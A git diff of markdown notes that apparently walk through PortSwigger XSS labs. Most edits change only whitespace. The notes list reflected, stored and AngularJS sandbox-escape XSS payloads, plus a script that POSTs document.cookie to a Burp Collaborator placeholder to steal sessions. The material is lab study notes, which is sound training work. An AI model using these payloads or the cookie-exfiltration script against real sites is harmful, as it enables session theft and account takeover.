@@ -2509,7 +2509,7 @@ Content-Type: application/json
    - `%27` = `'`	
    - browse `'accesskey='x'onclick='alert(1)`	
      `https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)'
-   - trigger the shortcut key on windows: `ALT+SHIFT+X`  
+   - trigger the shortcut key on windows: `ALT+SHIFT+X`    
 
 **XSS into JavaScript**  
 10. Reflected XSS into a JavaScript string with **single quote and backslash escaped**  
@@ -2526,14 +2526,14 @@ Content-Type: application/json
     single' backslash\' >  var searchTerms = 'single\' backslash\\\'';
     ```
     - break out of the script block and inject a new script
-    `</script><script>alert(1)</script>`
+    `</script><script>alert(1)</script>`  
 11. Reflected XSS into a JavaScript string with **angle brackets HTML encoded**  
     - Test bad input
     ```
     angle <> > var searchTerms = 'angle &lt;&gt;';
     ```
     - Breaking out of a JavaScript string
-    - Input `'-alert(1)-'`, XSS success `var searchTerms = ''-alert(1)-'';`
+    - Input `'-alert(1)-'`, XSS success `var searchTerms = ''-alert(1)-'';`  
 12. Reflected XSS into a JavaScript string with **angle brackets and double quotes HTML-encoded** and **single quotes escaped**
     - Test bad input
     ```
@@ -2543,7 +2543,7 @@ Content-Type: application/json
     ```
     - break out of the JavaScript string and inject an alert
       `\'-alert(1)//` > `var searchTerms = '\\'-alert(1)//';`
-    - the **single quote** (') ends a string in JavaScript prematurely, and **alert(1)** is then executed as a separate command. The **//** part is used to comment out the rest of the JavaScript line
+    - the **single quote** (') ends a string in JavaScript prematurely, and **alert(1)** is then executed as a separate command. The **//** part is used to comment out the rest of the JavaScript line  
 13. Reflected XSS in a **JavaScript URL** with some characters blocked
     - `postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'`
     - `27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27`
@@ -2555,17 +2555,17 @@ Content-Type: application/json
     - triggers the onerror event handler  
     - Overriding `toString: toString=x` 
     - Coercing window to a String: `window%2b%27%27` 
-    - Ending the Payload: `{x:%27`  
+    - Ending the Payload: `{x:%27`    
 14. **Stored XSS into onclick event** with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped.  
     - Normal payload in href `<a id="author" href="https://www.attacker.com" onclick="var tracker={track(){}};tracker.track('https://www.attacker.com');">yuyu</a>`  
     - Test single quote `http://evil.com' +alert() + '` > `<a id="author" href="http://evil.com\' +alert() + \'" onclick="var tracker={track(){}};tracker.track('http://evil.com\' +alert() + \'');">yuyu</a>`  
     - Use html entities `http://foo?&apos;-alert(1)-&apos;` > `<a id="author" href="http://foo?'-alert(1)-'"`  
-15. Reflected XSS into a **template literal** with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
+15. Reflected XSS into a **template literal** with angle brackets, single, double quotes, backslash and backticks Unicode-escaped  
     - template literal in js var message = `0 search results for 'hello'`;
-    - Input `${alert(1)}` > var message = `0 search results for '${alert(1)}'`;
+    - Input `${alert(1)}` > var message = `0 search results for '${alert(1)}'`;  
 
 **Client-side template injection**  
-16. Reflected XSS with **AngularJS** sandbox escape without strings (expert)
+16. Reflected XSS with **AngularJS** sandbox escape without strings (expert)  
     - The exploit uses toString() to create a string without using quotes. It then gets the String prototype and overwrites the charAt function for every string. This effectively breaks the AngularJS sandbox.
     - An array is passed to the orderBy filter. We then set the argument for the filter by again using toString() to create a string and the String constructor property  
     - we use the fromCharCode method generate our payload by converting character codes into the string x=alert(1). Because the charAt function has been overwritten, AngularJS will allow this code where normally it would not
@@ -2579,8 +2579,8 @@ Content-Type: application/json
       $scope.query[key] = '1';
       $scope.value = $parse(key)($scope.query);
       });
-      ```
-17. Reflected XSS with AngularJS sandbox escape and CSP (expoert)
+      ```  
+17. Reflected XSS with AngularJS sandbox escape and CSP (expoert)  
     - The exploit uses the ng-focus event in AngularJS to create a focus event that bypasses CSP. It also uses $event, which is an AngularJS variable that references the event object
     - The path property is specific to Chrome and contains an array of elements that triggered the event. The last element in the array contains the window object.
     - the orderBy filter. The colon signifies an argument that is being sent to the filter. In the argument, instead of calling the alert function directly, we assign it to the variable z
@@ -2588,23 +2588,23 @@ Content-Type: application/json
     - Exploit server `search=<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x';`
       ```
       <script>
-	location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
+	location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';  
       </script>
       ```
 **Exploiting XSS vulnerabilities**  
-18. Exploiting cross-site scripting to **steal cookies**
+18. Exploiting cross-site scripting to **steal cookies**  
     - limitation: user not logged in, HttpOnly flag, block user IP, session time out	
     - Post comment and capture the session value in Burp Collaborator
-    ```
-    <script>
+      ```
+      <script>
 	fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
 	method: 'POST',
 	mode: 'no-cors',
 	body:document.cookie
 	});
-    </script>
-    ```
-19. Exploiting cross-site scripting to **capture passwords**	
+      </script>
+      ```
+19. Exploiting cross-site scripting to **capture passwords**  
     - Target password manager that performs **password auto-fill**	
     - Post comment and capture the password value in Burp Collaborator
     ```
